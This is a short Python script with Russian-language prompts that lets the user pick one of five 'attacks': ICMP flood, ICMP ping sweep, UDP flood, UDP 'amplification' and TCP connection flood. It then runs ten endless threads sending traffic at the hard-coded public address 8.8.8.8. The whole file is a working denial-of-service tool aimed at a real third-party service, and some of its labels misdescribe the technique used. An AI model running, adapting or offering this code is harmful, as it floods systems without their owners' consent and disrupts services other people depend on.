import subprocess
import threading
import time
import socket

def icmp_flood_worker():
    while True:
        subprocess.run(["ping", "8.8.8.8", "-n", "1", "-l", "2000", "-w", "100"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def icmp_sweep_worker():
    while True:
        subprocess.run(["ping", "8.8.8.8", "-n", "1", "-l", "32", "-w", "100"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def udp_flood_worker():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = b"X" * 10
    while True:
        try:
            sock.sendto(payload, ("8.8.8.8", 4444))
            time.sleep(0.01)
        except: pass

def udp_amp_worker():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = b"X" * 1400
    while True:
        try:
            sock.sendto(payload, ("8.8.8.8", 4444))
            time.sleep(0.01)
        except: pass

def tcp_syn_worker():
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.1)
            sock.connect(("8.8.8.8", 80))
            sock.close()
        except: pass
        time.sleep(0.01)


print("Запуск конкретной атаки...")
print("1 - ICMP Flood")
print("2 - ICMP Ping Sweep")
print("3 - UDP Flood")
print("4 - UDP Amplification")
print("5 - TCP SYN Flood")

choice = input("Выберите тип генерации (1-5): ")

if choice == '1': target_func = icmp_flood_worker
elif choice == '2': target_func = icmp_sweep_worker
elif choice == '3': target_func = udp_flood_worker
elif choice == '4': target_func = udp_amp_worker
elif choice == '5': target_func = tcp_syn_worker
else:
    print("Неверный выбор.")
    exit()

for i in range(10):
    t = threading.Thread(target=target_func, daemon=True)
    t.start()

try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    print("Остановка атаки.")